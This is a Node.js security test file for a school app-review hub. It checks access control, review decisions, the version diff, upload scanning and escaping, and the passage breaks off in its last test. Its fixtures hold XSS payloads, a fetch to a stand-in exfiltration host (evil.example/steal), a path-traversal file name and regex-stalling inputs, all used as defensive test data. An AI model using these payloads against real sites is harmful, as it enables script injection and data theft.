'use strict';
// Attack tests for package B: the review queue and workbench, decisions, the
// diff, upload checks, the owner's app page (usage, sharing, school-wide
// updates, upload clean-up) and escaping of everything users write.

const { test, before, after } = require('node:test');
const assert = require('node:assert/strict');
const http = require('node:http');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { startHub, makeZip } = require('./helpers');

let h;
let admin, lehmann, yilmaz, mia, ben, lena;
let A, L, Y, M, B, LE;
let cls7b, cls9c;

const teacherClass = (userId, name) => h.db.get("SELECT c.id FROM classes c JOIN class_members m ON m.class_id = c.id AND m.user_id = ? AND m.role = 'teacher' WHERE c.name = ?", userId, name).id;
const joinCode = (classId) => h.db.get("SELECT code FROM join_codes WHERE class_id = ? AND role = 'student'", classId).code;
const appRow = (id) => h.db.get('SELECT * FROM apps WHERE id = ?', id);
const classApp = (classId, appId) => h.db.get('SELECT * FROM class_apps WHERE class_id = ? AND app_id = ?', classId, appId);
/** The HTML of one <section id="…"> of a page. */
function section(text, id) {
  const start = text.indexOf(`id="${id}"`);
  assert.ok(start > 0, `section ${id} exists`);
  return text.slice(start, text.indexOf('</section>', start));
}
/** A student's app, published and submitted to a class (waits for the teacher). */
async function submitted(b, name, classId, files) {
  const a = await h.makeApp(b, name, files);
  await b.post(`/apps/${a.id}/einreichen`, { klasse: classId });
  assert.equal(classApp(classId, a.id).request_state, 'waiting');
  return appRow(a.id);
}

before(async () => {
  h = await startHub();
  admin = h.addUser('Anna Adler', 'admin');
  lehmann = h.addUser('Herr Lehmann', 'teacher');
  yilmaz = h.addUser('Frau Yilmaz', 'teacher');
  mia = h.addUser('Mia Schmidt', 'student');
  ben = h.addUser('Ben Hoffmann', 'student');
  lena = h.addUser('Lena Wagner', 'student');
  [A, L, Y, M, B, LE] = await Promise.all([admin, lehmann, yilmaz, mia, ben, lena].map((u) => h.browser().login(u)));
  await L.post('/klassen', { name: '7b' });
  cls7b = teacherClass(lehmann.id, '7b');
  await Y.post('/klassen', { name: '9c' });
  cls9c = teacherClass(yilmaz.id, '9c');
  for (const b of [M, B]) await b.post(`/beitreten/${joinCode(cls7b)}`);
  await LE.post(`/beitreten/${joinCode(cls9c)}`);
});
after(() => h.stop());

// ------------------------------------------------------------------ queue

test('Prüfen-Liste: nur wartende Apps aus den eigenen, aktiven Klassen', async () => {
  const miaApp = await submitted(M, 'Mias Liste', cls7b);
  const lenaApp = await submitted(LE, 'Lenas Liste', cls9c);
  // an archived class of the same teacher: its waiting app does not show
  await L.post('/klassen', { name: 'Alt' });
  const old = teacherClass(lehmann.id, 'Alt');
  await B.post(`/beitreten/${joinCode(old)}`);
  const benOld = await submitted(B, 'Bens Altes', old);
  h.db.run('UPDATE classes SET archived_at = ? WHERE id = ?', Date.now(), old);

  const l = (await L.get('/pruefen')).text;
  assert.ok(l.includes('Mias Liste'));
  assert.ok(!l.includes('Lenas Liste'), 'another teacher’s class');
  assert.ok(!l.includes('Bens Altes'), 'archived class');
  assert.ok(!l.includes(cls9c) && !l.includes(old));
  const y = (await Y.get('/pruefen')).text;
  assert.ok(y.includes('Lenas Liste') && !y.includes('Mias Liste'));
  // students have no queue; an empty queue says so
  for (const b of [M, B, LE]) assert.equal((await b.get('/pruefen')).status, 404);
  const fresh = await h.browser().login(h.addUser('Neue Lehrkraft', 'teacher'));
  assert.match((await fresh.get('/pruefen')).text, /Alles geprüft/);
  // the archived request is not reachable in the workbench either, not even for its teacher
  assert.equal((await L.get(`/pruefen/${old}/${benOld.id}`)).status, 404);
  // clean up for the next tests
  await L.post(`/pruefen/${cls7b}/${miaApp.id}/freigeben`, { version: miaApp.published_version_id });
  await Y.post(`/pruefen/${cls9c}/${lenaApp.id}/freigeben`, { version: lenaApp.published_version_id });
});

// -------------------------------------------------------------- workbench

test('Prüfplatz: 404 für fremde Lehrkräfte, Schüler/innen und Unbekanntes; die Vorschau ist eingebettet wie im Player', async () => {
  const app = await submitted(M, 'Prüfplatz-Test', cls7b);
  const url = `/pruefen/${cls7b}/${app.id}`;
  for (const who of [Y, M, B, LE]) assert.equal((await who.get(url)).status, 404, 'not a teacher of this class');
  for (const bad of [`/pruefen/${cls9c}/${app.id}`, `/pruefen/${cls7b}/gibtsnicht`, `/pruefen/x/${app.id}`, `/pruefen/${cls7b}/${'x'.repeat(400)}`]) {
    assert.equal((await L.get(bad)).status, 404, bad);
  }
  const page = await L.get(url);
  assert.equal(page.status, 200);
  const v = app.published_version_id;
  assert.match(page.text, new RegExp(`<div class="stage review-stage" id="stage" data-origin="[^"]+" data-token-url="/apps/${app.id}/token" data-class="${cls7b}" data-version="${v}" data-draft="">`));
  assert.match(page.text, /<iframe id="appframe" [^>]*sandbox="allow-scripts allow-same-origin allow-forms allow-modals allow-pointer-lock"/);
  assert.match(page.text, /<script src="\/static\/player\.js" defer>/);
  assert.ok(!/\sstyle="/.test(page.text), 'no inline styles');
  // the preview token is a preview: nothing is stored, nothing counts as a play
  const t = await h.token(L, app, cls7b, v);
  assert.equal(t.mode, 'preview');
  assert.equal(h.db.get('SELECT COUNT(*) AS n FROM plays WHERE app_id = ?', app.id).n, 0);
  // the admin may review in any class
  assert.equal((await A.get(url)).status, 200);
  await L.post(`${url}/freigeben`, { version: v });
});

test('Entscheiden: nur über genau die wartende Version, nur durch die Lehrkraft der Klasse', async () => {
  const app = await submitted(M, 'Entscheidungs-Test', cls7b);
  const v1 = app.published_version_id;
  const url = `/pruefen/${cls7b}/${app.id}`;
  for (const who of [Y, M, B]) {
    assert.equal((await who.post(`${url}/freigeben`, { version: v1 })).status, 404);
    assert.equal((await who.post(`${url}/zurueckgeben`, { version: v1, grund: 'Hack' })).status, 404);
    assert.equal((await who.post(`${url}/kommentar`, { text: 'Hack' })).status, 404);
  }
  assert.equal((await L.post(`${url}/freigeben`, { version: 'falsch' })).status, 400);
  assert.equal((await L.post(`${url}/freigeben`, {})).status, 400);
  assert.equal((await L.post(`${url}/zurueckgeben`, { version: v1, grund: '' })).status, 400, 'a reason is required');
  assert.equal(classApp(cls7b, app.id).request_state, 'waiting');

  // A newer version is published while the teacher looks at the old one: the old form no longer works.
  const v2 = await h.uploadFolder(M, app.id, { 'index.html': '<h1>v2</h1>' });
  await M.post(`/apps/${app.id}/veroeffentlichen`, { version: v2 });
  assert.equal((await L.post(`${url}/freigeben`, { version: v1 })).status, 400, 'the reviewed version is not the waiting one any more');
  assert.equal((await L.post(`${url}/zurueckgeben`, { version: v2, grund: 'Bitte noch eine Anleitung.' })).status, 303);
  const row = classApp(cls7b, app.id);
  assert.deepEqual([row.request_state, row.requested_version_id], ['returned', v2]);
  // returned: the workbench is read-only, deciding is refused
  const ro = await L.get(url);
  assert.equal(ro.status, 200);
  assert.ok(!ro.text.includes('review-decide'), 'no decision bar');
  assert.ok(ro.text.includes('Bitte noch eine Anleitung.'));
  assert.equal((await L.post(`${url}/freigeben`, { version: v2 })).status, 400);
  // the owner sees the reason on the app page and in the history
  const own = await M.get(`/apps/${app.id}`);
  assert.ok(own.text.includes('In 7b zurückgegeben') && own.text.includes('Bitte noch eine Anleitung.'));
  // a comment from the workbench belongs to this class and reaches the owner
  await M.post(`/apps/${app.id}/einreichen`, { klasse: cls7b });
  assert.equal((await L.post(`${url}/kommentar`, { text: 'Sieht schon gut aus.' })).status, 303);
  const c = h.db.get("SELECT * FROM comments WHERE app_id = ? AND body = 'Sieht schon gut aus.'", app.id);
  assert.deepEqual([c.kind, c.class_id, c.version_id], ['comment', cls7b, v2]);
  assert.ok(h.db.get("SELECT 1 AS ok FROM notices WHERE user_id = ? AND kind = 'kommentar'", mia.id));
  await L.post(`${url}/freigeben`, { version: v2 });
  assert.equal(classApp(cls7b, app.id).version_id, v2);
});

test('Nach der Entscheidung geht es nur in den eigenen Klassen weiter', async () => {
  const lenaApp = await submitted(LE, 'Lenas Wartendes', cls9c); // waits in another teacher's class
  const first = await submitted(M, 'Erste im Stapel', cls7b);
  const second = await submitted(B, 'Zweite im Stapel', cls7b);
  const one = await L.post(`/pruefen/${cls7b}/${first.id}/freigeben`, { version: first.published_version_id });
  assert.equal(one.status, 303);
  assert.equal(one.headers.location, `/pruefen/${cls7b}/${second.id}`);
  const two = await L.post(`/pruefen/${cls7b}/${second.id}/zurueckgeben`, { version: second.published_version_id, grund: 'Noch nicht fertig.' });
  assert.equal(two.headers.location, '/pruefen', 'nothing left in MY classes - never the other class');
  assert.match((await L.get('/pruefen')).text, /Alles geprüft/);
  // the admin deciding in a class they do not teach is not sent into that teacher's queue either
  const third = await submitted(B, 'Dritte im Stapel', cls7b);
  const byAdmin = await A.post(`/pruefen/${cls7b}/${third.id}/freigeben`, { version: third.published_version_id });
  assert.equal(byAdmin.headers.location, '/pruefen');
  assert.equal(classApp(cls9c, lenaApp.id).request_state, 'waiting', 'untouched');
  await Y.post(`/pruefen/${cls9c}/${lenaApp.id}/freigeben`, { version: lenaApp.published_version_id });
});

// -------------------------------------------------------------------- diff

test('Änderungen: nur zwischen sichtbaren Versionen, HTML im Vergleich wird nie ausgeführt', async () => {
  const app = await h.makeApp(M, 'Diff-Test', { 'index.html': '<h1>Hallo</h1>\n<p>alt</p>\n', 'a.js': 'let x = 1;\n', 'bild.png': 'PNG1' });
  await M.post(`/apps/${app.id}/einreichen`, { klasse: cls7b });
  await L.post(`/pruefen/${cls7b}/${app.id}/freigeben`, { version: app.published_version_id });
  const v2 = await h.uploadFolder(M, app.id, {
    'index.html': '<h1>Hallo</h1>\n<p>neu <script>alert("diff")</script></p>\n',
    'a.js': 'let x = 2;\n</script><img src=x onerror=alert(1)>\n',
    'bild.png': 'PNG2',
    'neu.css': 'body { color: red }\n',
  });
  await M.post(`/apps/${app.id}/veroeffentlichen`, { version: v2 });
  const secret = await h.uploadFolder(M, app.id, { 'index.html': '<p>geheimer Entwurf</p>' }); // private, never submitted

  const page = await L.get(`/pruefen/${cls7b}/${app.id}?basis=${secret}&version=${secret}`);
  assert.equal(page.status, 200);
  assert.ok(page.text.includes('Änderungen seit Version 1'));
  assert.ok(page.text.includes('&lt;script&gt;alert(&quot;diff&quot;)&lt;/script&gt;'), 'escaped');
  assert.ok(!page.text.includes('<script>alert("diff")'), 'never raw');
  assert.ok(!page.text.includes('<img src=x'), 'never raw');
  assert.ok(page.text.includes('Keine Textdatei'), 'binary files are listed, not compared');
  assert.ok(page.text.includes(`data-version="${v2}"`), 'the preview shows the waiting version');
  assert.ok(!page.text.includes(secret) && !page.text.includes('geheimer Entwurf'), 'query parameters cannot pick other versions');
  // both versions of the comparison must be visible to the reviewer
  const { access } = h.hub.ctx;
  const a = appRow(app.id);
  assert.equal(access.canSeeVersion(lehmann, a, app.published_version_id), true);
  assert.equal(access.canSeeVersion(lehmann, a, v2), true);
  assert.equal(access.canSeeVersion(lehmann, a, secret), false);
  assert.equal(access.canSeeVersion(yilmaz, a, v2), false);
  await L.post(`/pruefen/${cls7b}/${app.id}/freigeben`, { version: v2 });

  // the diff module itself never touches binary files
  const { diffVersions } = require('../src/versionDiff');
  const d = diffVersions(h.hub.ctx.uploads, app.published_version_id, v2);
  assert.equal(d.files.find((f) => f.path === 'bild.png').kind, 'binary');
  assert.equal(d.files.find((f) => f.path === 'neu.css').status, 'added');
  assert.deepEqual([d.totals.changedFiles, d.totals.addedFiles], [3, 1]);
});

// ------------------------------------------------------------------ checks

test('Prüfbericht: externe Skripte, absolute Pfade, fehlende Teile – gemeldet, nichts wird ausgeführt', async () => {
  const marker = path.join(os.tmpdir(), `schulhub-pwned-${process.pid}`);
  const evil = `require('fs').writeFileSync(${JSON.stringify(marker)}, 'x'); globalThis.__pwned = 1; process.exit(1);`;
  const app = await h.makeApp(M, 'Check-Test', {
    'index.html': '<!doctype html>\n<html><head>\n<script src="https://evil.example/x.js"></script>\n</head>\n<body><img src="/bild.png">\n<script>Hub.connect(); fetch("https://evil.example/steal"); localStorage.x = 1;</script></body></html>\n',
    'app.js': evil,
    'style.css': 'body { background: url(/hintergrund.png) }',
  });
  const report = JSON.parse(h.db.get('SELECT report FROM app_versions WHERE id = ?', app.published_version_id).report);
  const find = (level, re) => report.items.find((i) => i.level === level && re.test(i.text));
  const ext = find('error', /https:\/\/evil\.example\/x\.js/);
  assert.ok(ext, 'external script is an error');
  assert.deepEqual([ext.file, ext.line], ['index.html', 3]);
  assert.ok(find('warning', /„\/bild\.png“/), 'absolute path in src');
  assert.ok(find('warning', /„\/hintergrund\.png“/), 'absolute path in url()');
  assert.ok(find('warning', /fetch\(\) an „https:\/\/evil\.example\/steal“/), 'fetch to the internet');
  assert.ok(find('warning', /hub-sdk\.js/), 'Hub.connect without hub-sdk.js');
  assert.ok(find('warning', /viewport/), 'no viewport');
  assert.ok(find('note', /<title>/), 'no title');
  assert.ok(find('note', /localStorage/), 'localStorage');
  assert.deepEqual(report.uses.sort(), ['browser']);
  assert.ok(report.stats && 'manifest' in report, 'the report keeps its shape');
  // nothing was executed
  assert.equal(fs.existsSync(marker), false);
  assert.equal(globalThis.__pwned, undefined);
  // the owner sees it right after the upload, escaped
  const fresh = await M.get(`/apps/${app.id}?neu=${app.published_version_id}`);
  assert.ok(fresh.text.includes('Version 1 ist hochgeladen'));
  assert.ok(fresh.text.includes('https://evil.example/x.js'));
  assert.ok(!fresh.text.includes('<script src="https://evil.example'));
  // a clean app has nothing to report; a hostile one cannot make the check slow
  const clean = await h.makeApp(M, 'Sauber', { 'index.html': '<!doctype html><html><head><meta name="viewport" content="width=device-width"><title>OK</title></head><body><script src="hub-sdk.js"></script><script>Hub.connect().then((hub) => hub.save.set("a", 1))</script></body></html>' });
  const cleanReport = JSON.parse(h.db.get('SELECT report FROM app_versions WHERE id = ?', clean.published_version_id).report);
  assert.deepEqual(cleanReport.items, []);
  assert.deepEqual(cleanReport.uses, ['save']);
  const started = Date.now();
  await h.makeApp(M, 'Langsam?', { 'index.html': '<script '.repeat(30000) + '<a href="'.repeat(5000) + 'url( '.repeat(20000) });
  assert.ok(Date.now() - started < 3000, 'bounded regular expressions');
});

// ------------------------------------------------------- the owner's page

test('Nutzung: keine Namen, keine Zahlen je Klasse, kleine Zahlen bleiben verborgen', async () => {
  const app = await h.makeApp(L, 'Nutzungs-Test');
  await L.post(`/klassen/${cls7b}/apps`, { app: app.id });
  for (const b of [M, B]) {
    const t = await h.token(b, app, cls7b);
    await b.api(app, t.token, 'results.add', { title: 'Runde', score: 4, maxScore: 5 });
  }
  let usage = section((await L.get(`/apps/${app.id}`)).text, 'nutzung');
  assert.ok(usage.includes('weniger als 5'));
  assert.ok(usage.includes('zu wenige Daten'));
  for (const word of ['Mia', 'Ben', '7b', '80 %']) assert.ok(!usage.includes(word), `no ${word}`);
  // with two people even the openings per day and in total would describe what single persons did
  assert.ok(!usage.includes('<svg'), 'no daily chart below five people');
  assert.ok(!/<span class="stat-value">2<\/span>/.test(usage), 'no exact number of openings');
  assert.ok(usage.includes('erst, wenn mindestens fünf Personen'));
  // with enough people the average appears - still without names or classes
  const others = await Promise.all(['Ole', 'Pia', 'Raul', 'Sina'].map(async (n) => {
    const b = await h.browser().login(h.addUser(`${n} Muster`, 'student'));
    await b.post(`/beitreten/${joinCode(cls7b)}`);
    return b;
  }));
  for (const b of others) {
    const t = await h.token(b, app, cls7b);
    await b.api(app, t.token, 'results.add', { title: 'Runde', score: 2, maxScore: 5 });
  }
  usage = section((await L.get(`/apps/${app.id}`)).text, 'nutzung');
  assert.ok(usage.includes('6') && usage.includes('53 %'), 'six people, average (2*80 + 4*40)/6 = 53 %');
  assert.ok(usage.includes('<svg'), 'the daily chart from five people on');
  for (const word of ['Mia', 'Ben', 'Ole', 'Muster', '7b']) assert.ok(!usage.includes(word), `no ${word}`);
  // previews never count
  const before = h.db.get('SELECT COUNT(*) AS n FROM plays WHERE app_id = ?', app.id).n;
  await h.token(L, app, cls7b, app.published_version_id);
  assert.equal(h.db.get('SELECT COUNT(*) AS n FROM plays WHERE app_id = ?', app.id).n, before);
  // only the owner (and the admin) see usage
  const studentApp = await submitted(M, 'Nur für Mia', cls7b);
  assert.ok(!(await L.get(`/apps/${studentApp.id}`)).text.includes('id="nutzung"'), 'not for the reviewing teacher');
  assert.ok((await A.get(`/apps/${studentApp.id}`)).text.includes('id="nutzung"'));
  await L.post(`/pruefen/${cls7b}/${studentApp.id}/freigeben`, { version: studentApp.published_version_id });
});

test('Mit Kolleg/innen teilen: nur Lehrkräfte als Besitzer', async () => {
  const studentApp = await h.makeApp(M, 'Schüler-Teilen');
  const page = await M.get(`/apps/${studentApp.id}`);
  assert.ok(!page.text.includes('Mit Kolleg/innen teilen'), 'no switch for students');
  const fields = { name: 'Schüler-Teilen', emoji: '🎮', color: '0', shared_field: '1', shared: '1' };
  assert.equal((await M.post(`/apps/${studentApp.id}/bearbeiten`, fields)).status, 303);
  assert.equal(appRow(studentApp.id).shared, 0, 'a student cannot bypass review by sharing');
  await A.post(`/apps/${studentApp.id}/bearbeiten`, fields);
  assert.equal(appRow(studentApp.id).shared, 0, 'not even the admin for a student’s app');
  assert.equal((await Y.post(`/apps/${studentApp.id}/bearbeiten`, fields)).status, 404);

  const teacherApp = await h.makeApp(L, 'Lehrer-Teilen');
  assert.ok((await L.get(`/apps/${teacherApp.id}`)).text.includes('Mit Kolleg/innen teilen'));
  await L.post(`/apps/${teacherApp.id}/bearbeiten`, { ...fields, name: 'Lehrer-Teilen' });
  assert.equal(appRow(teacherApp.id).shared, 1);
  assert.ok(h.db.get("SELECT 1 AS ok FROM audit_log WHERE action = 'app_geteilt' AND target = 'Lehrer-Teilen'"));
  // a form without the switch leaves it as it is; unticking switches it off
  await L.post(`/apps/${teacherApp.id}/bearbeiten`, { name: 'Lehrer-Teilen', emoji: '🎮', color: '1' });
  assert.equal(appRow(teacherApp.id).shared, 1);
  await L.post(`/apps/${teacherApp.id}/bearbeiten`, { name: 'Lehrer-Teilen', emoji: '🎮', color: '1', shared_field: '1' });
  assert.equal(appRow(teacherApp.id).shared, 0);
});

test('Schulweites Update: nur die Verwaltung gibt es frei – und nur genau die wartende Version', async () => {
  const app = await h.makeApp(L, 'Schulweit-Test', { 'index.html': 'v1' });
  const v1 = app.published_version_id;
  await A.post(`/apps/${app.id}/schulweit`, { an: '1' });
  assert.equal(appRow(app.id).schoolwide_version_id, v1);
  const v2 = await h.uploadFolder(L, app.id, { 'index.html': 'v2' });
  await L.post(`/apps/${app.id}/veroeffentlichen`, { version: v2 });
  assert.deepEqual([appRow(app.id).schoolwide_version_id, appRow(app.id).schoolwide_requested_version_id], [v1, v2], 'the update waits');
  assert.ok((await A.get(`/apps/${app.id}`)).text.includes('Version 2 wartet auf die schulweite Freigabe'));
  assert.ok((await L.get(`/apps/${app.id}`)).text.includes('wartet auf die Verwaltung'));
  for (const who of [L, Y, M]) assert.equal((await who.post(`/apps/${app.id}/schulweit`, { update: v2 })).status, 404);
  assert.equal(appRow(app.id).schoolwide_version_id, v1);
  assert.equal((await A.post(`/apps/${app.id}/schulweit`, { update: v1 })).status, 400, 'only the waiting version');
  assert.equal((await A.post(`/apps/${app.id}/schulweit`, { update: v2 })).status, 303);
  assert.deepEqual([appRow(app.id).schoolwide_version_id, appRow(app.id).schoolwide_requested_version_id], [v2, null]);
  assert.ok(h.db.get("SELECT 1 AS ok FROM audit_log WHERE action = 'schulweit_aktualisiert' AND target = 'Schulweit-Test'"));
  // turning it down keeps the released version; switching off clears everything
  const v3 = await h.uploadFolder(L, app.id, { 'index.html': 'v3' });
  await L.post(`/apps/${app.id}/veroeffentlichen`, { version: v3 });
  assert.equal((await A.post(`/apps/${app.id}/schulweit`, { verwerfen: v3 })).status, 303);
  assert.deepEqual([appRow(app.id).schoolwide_version_id, appRow(app.id).schoolwide_requested_version_id], [v2, null]);
  assert.ok(h.db.get("SELECT 1 AS ok FROM notices WHERE user_id = ? AND text LIKE '%nicht schulweit%'", lehmann.id));
  await A.post(`/apps/${app.id}/schulweit`, { an: '0' });
  assert.equal(appRow(app.id).schoolwide_version_id, null);
});

test('Abgebrochene Uploads: nur wer die App verwaltet räumt auf – fertige Versionen bleiben', async () => {
  const app = await submitted(M, 'Aufräum-Test', cls7b); // the teacher may review it, but not touch uploads
  const v = (await M.send('POST', `/apps/${app.id}/versionen`)).json();
  await M.send('PUT', `/apps/${app.id}/versionen/${v.id}/datei?pfad=index.html`, Buffer.from('<p>halb</p>'), 'application/octet-stream');
  for (const who of [B, L, Y, LE]) assert.equal((await who.send('POST', `/apps/${app.id}/versionen/${v.id}/abbrechen`)).status, 404);
  assert.ok(h.db.get('SELECT 1 AS ok FROM app_versions WHERE id = ?', v.id));
  // a finished version can never be removed this way
  assert.equal((await M.send('POST', `/apps/${app.id}/versionen/${app.published_version_id}/abbrechen`)).status, 404);
  assert.ok(h.db.get('SELECT 1 AS ok FROM app_versions WHERE id = ?', app.published_version_id));
  // the owner's cancel removes the unfinished version and its files
  assert.equal((await M.send('POST', `/apps/${app.id}/versionen/${v.id}/abbrechen`)).status, 200);
  assert.equal(h.db.get('SELECT COUNT(*) AS n FROM app_versions WHERE id = ?', v.id).n, 0);
  assert.equal(h.db.get('SELECT COUNT(*) AS n FROM app_files WHERE version_id = ?', v.id).n, 0);
  assert.equal((await M.send('POST', `/apps/${app.id}/versionen/${v.id}/abbrechen`)).status, 404, 'only once');
  // withdrawing and taking out of a class: only the owner
  for (const who of [B, L, Y]) {
    assert.equal((await who.post(`/apps/${app.id}/zurueckziehen`, { klasse: cls7b })).status, 404);
    assert.equal((await who.post(`/apps/${app.id}/aus-klasse`, { klasse: cls7b })).status, 404);
  }
  assert.equal((await M.post(`/apps/${app.id}/zurueckziehen`, { klasse: cls7b })).status, 303);
  assert.equal(classApp(cls7b, app.id), undefined, 'a request that was never approved disappears');
});

test('Lehrkräfte sehen auf der App-Seite nur ihre eigenen Klassen', async () => {
  // Mia is in 7b (Lehmann) and in 9c (Yilmaz); her app waits in both.
  await M.post(`/beitreten/${joinCode(cls9c)}`);
  const app = await submitted(M, 'Zwei Klassen', cls7b);
  await M.post(`/apps/${app.id}/einreichen`, { klasse: cls9c });
  await L.post(`/pruefen/${cls7b}/${app.id}/kommentar`, { text: 'Nur für die 7b gedacht.' });
  await L.post(`/pruefen/${cls7b}/${app.id}/zurueckgeben`, { version: app.published_version_id, grund: 'Grund aus der 7b.' });
  const y = (await Y.get(`/apps/${app.id}`)).text;
  assert.ok(y.includes('Wartet auf deine Prüfung in 9c'));
  for (const word of ['Grund aus der 7b', 'Nur für die 7b gedacht', cls7b]) assert.ok(!y.includes(word), word);
  const yBench = (await Y.get(`/pruefen/${cls9c}/${app.id}`)).text;
  for (const word of ['Grund aus der 7b', 'Nur für die 7b gedacht', cls7b]) assert.ok(!yBench.includes(word), word);
  // the owner sees everything
  const m = (await M.get(`/apps/${app.id}`)).text;
  assert.ok(m.includes('Grund aus der 7b') && m.includes('Nur für die 7b gedacht'));
  await Y.post(`/pruefen/${cls9c}/${app.id}/freigeben`, { version: app.published_version_id });
  h.db.run('DELETE FROM class_members WHERE class_id = ? AND user_id = ?', cls9c, mia.id);
});

// ---------------------------------------------------------------- escaping

test('Versionsnotizen, Namen und Quelltext werden überall escaped', async () => {
  const evil = '<script>alert(1)</script><img src=x onerror=alert(2)>';
  const created = await M.post('/apps', { name: 'Notiz-Test', emoji: '🎮', color: '0', category: 'Englisch', grade_min: '5', grade_max: '7' });
  const id = created.headers.location.split('/').pop();
  assert.deepEqual([appRow(id).category, appRow(id).grade_min, appRow(id).grade_max], ['Englisch', 5, 7]);
  // a note via the folder upload ...
  const v = (await M.send('POST', `/apps/${id}/versionen`)).json();
  await M.send('PUT', `/apps/${id}/versionen/${v.id}/datei?pfad=index.html`, Buffer.from(`<p>${evil}</p>`), 'application/octet-stream');
  await M.send('PUT', `/apps/${id}/versionen/${v.id}/datei?pfad=hub-sdk.js`, Buffer.from('/* fake sdk */ alert("fake")'), 'application/octet-stream');
  const done = (await M.send('POST', `/apps/${id}/versionen/${v.id}/fertig`, { notiz: `Ordner ${evil}` })).json();
  assert.ok(Array.isArray(done.report.items));
  // ... and via the zip upload
  const zip = await M.send('POST', `/apps/${id}/versionen/zip?notiz=${encodeURIComponent(`Zip ${evil}`)}`, makeZip([{ name: 'index.html', data: '<p>zip</p>' }]), 'application/zip');
  assert.equal(zip.status, 200);
  assert.equal(h.db.get('SELECT note FROM app_versions WHERE id = ?', zip.json().id).note, `Zip ${evil}`);
  await M.post(`/apps/${id}/veroeffentlichen`, { version: v.id });
  await M.post(`/apps/${id}/einreichen`, { klasse: cls7b });
  for (const [who, url] of [[M, `/apps/${id}`], [M, `/apps/${id}?neu=${zip.json().id}`], [M, '/apps'], [L, '/pruefen'], [L, `/pruefen/${cls7b}/${id}`], [L, `/apps/${id}`],
    [L, `/apps/${id}/versionen/${v.id}/quelltext`], [M, `/apps/${id}/versionen/${zip.json().id}/quelltext`]]) {
    const res = await who.get(url);
    assert.equal(res.status, 200, url);
    assert.ok(!res.text.includes('<script>alert(1)'), `raw script on ${url}`);
    assert.ok(!res.text.includes('<img src=x'), `raw img on ${url}`);
    assert.ok(!/\sstyle="/.test(res.text), `inline style on ${url}`);
  }
  assert.ok((await L.get(`/pruefen/${cls7b}/${id}`)).text.includes('Ordner &lt;script&gt;alert(1)'));
  // the Hub's own files are never shown with uploaded content
  const sdk = await L.get(`/apps/${id}/versionen/${v.id}/quelltext?datei=hub-sdk.js`);
  assert.ok(sdk.text.includes('Standard-Datei des Hubs') && !sdk.text.includes('fake sdk'));
  // a file name that does not exist is reported, not looked up on disk
  assert.match((await L.get(`/apps/${id}/versionen/${v.id}/quelltext?datei=${encodeURIComponent('../../hub.sqlite')}`)).text, /gibt es in Version 1 nicht/);
  // invalid grades are refused before anything is stored
  const before = h.db.get('SELECT COUNT(*) AS n FROM apps WHERE owner_id = ?', mia.id).n;
  assert.equal((await M.post('/apps', { name: 'Stufen', grade_min: '9', grade_max: '5' })).status, 400);
  assert.equal(h.db.get('SELECT COUNT(*) AS n FROM apps WHERE owner_id = ?', mia.id).n, before);
  await L.post(`/pruefen/${cls7b}/${id}/freigeben`, { version: v.id });
});

test('Neue App: ein Fehler führt zurück zum Formular, alle Eingaben bleiben stehen', async () => {
  const hub = h.config.hubOrigin;
  await M.page('/apps/neu');
  const res = await M.post('/apps', { name: 'x', description: 'Über <b>Tiere</b>', emoji: '🦊', color: '3', category: 'Musik', grade_min: '5', grade_max: '6' }, { headers: { referer: `${hub}/apps/neu` } });
  assert.equal(res.status, 303);
  assert.equal(res.headers.location, '/apps/neu');
  const back = await M.page('/apps/neu');
  assert.ok(back.text.includes('mindestens 2 Zeichen'));
  assert.ok(back.text.includes('Über &lt;b&gt;Tiere&lt;/b&gt;') && !back.text.includes('<b>Tiere</b>'));
  assert.match(back.text, /value="🦊" checked/);
  assert.match(back.text, /value="3" aria-label="Kirsche" checked/);
  assert.match(back.text, /<option value="Musik" selected>/);
  assert.match(back.text, /name="grade_max">[\s\S]*?<option value="6" selected>/);
  // unknown subjects and emojis fall back to safe values
  const ok = await M.post('/apps', { name: 'Fallback', emoji: '<svg>', color: '99', category: 'Zauberei' });
  const a = appRow(ok.headers.location.split('/').pop());
  assert.deepEqual([a.emoji, a.color, a.category, a.grade_min], ['🎮', 0, '', null]);
});

test('Prüfbericht: feindliche Dateien blockieren den Hub nicht – lineare Prüfung mit Zeitbudget', async () => {
  const { analyzeVersion, BUDGET_MS } = require('../src/checks');
  const fit = (unit) => Buffer.from(unit.repeat(Math.floor((512 * 1024 - 64) / unit.length)));
  const timed = (files) => {
    const list = Object.entries(files).map(([p, buf]) => ({ path: p, size: buf.length, sha256: p }));
    const ctx = { uploads: { listFiles: () => list, readBlob: (sha) => files[sha] } };
    const t0 = process.hrtime.bigint();
    const result = analyzeVersion(ctx, { id: 'v' });
    return { ms: Number(process.hrtime.bigint() - t0) / 1e6, result, ctx };
  };
  // the reviewer's shape: eight 512 KB files of "<a href=" + spaces (once ~600 ms per file)
  const hostile = fit('<a href=' + ' '.repeat(20));
  const eight = Object.fromEntries(['index.html', ...Array.from({ length: 7 }, (_, i) => `p${i}.html`)].map((p) => [p, hostile]));
  const run = timed(eight);
  assert.ok(run.ms < BUDGET_MS + 60, `eight hostile files took ${Math.round(run.ms)} ms`);
  // other shapes against the tag scanner, the script and the style patterns
  for (const [name, file] of [
    ['unclosed quotes', { 'index.html': fit('<img src="' + 'x'.repeat(30)) }],
    ['unclosed comments', { 'index.html': fit('<!--') }],
    ['style attributes', { 'index.html': fit('<p style="background:url(/x.png) url(//e.x/y)">') }],
    ['import spam', { 'a.js': fit('import ') }],
    ['fetch spam', { 'a.js': fit('fetch("') }],
    ['url( spam', { 'a.css': fit('url(') }],
    ['@import spam', { 'a.css': fit('@import   url(   ') }],
  ]) {
    const r = timed(file);
    assert.ok(r.ms < BUDGET_MS, `${name}: ${Math.round(r.ms)} ms`);
  }
  // when the budget is used up, the check stops and says so
  const cut = analyzeVersion(run.ctx, { id: 'v' }, { budgetMs: -1 });
  assert.ok(cut.report.items.some((i) => /Prüfung abgebrochen/.test(i.text)));

  // through a real upload: other requests are answered while the hostile zip is checked
  const app = await h.makeApp(M, 'Bremse?');
  const zip = makeZip(Object.entries(eight).map(([name, data]) => ({ name, data })));
  const upload = M.send('POST', `/apps/${app.id}/versionen/zip`, zip, 'application/zip');
  await new Promise((r) => setTimeout(r, 20));
  const t0 = Date.now();
  assert.equal((await h.browser().get('/static/hub.css')).status, 200);
  const waited = Date.now() - t0;
  assert.equal((await upload).status, 200);
  assert.ok(waited < 1000, `a static file waited ${waited} ms during the upload`);
});

test('Datei-Upload: Fremde werden abgewiesen, bevor der Inhalt gelesen wird', async () => {
  const app = await h.makeApp(M, 'Nur meins');
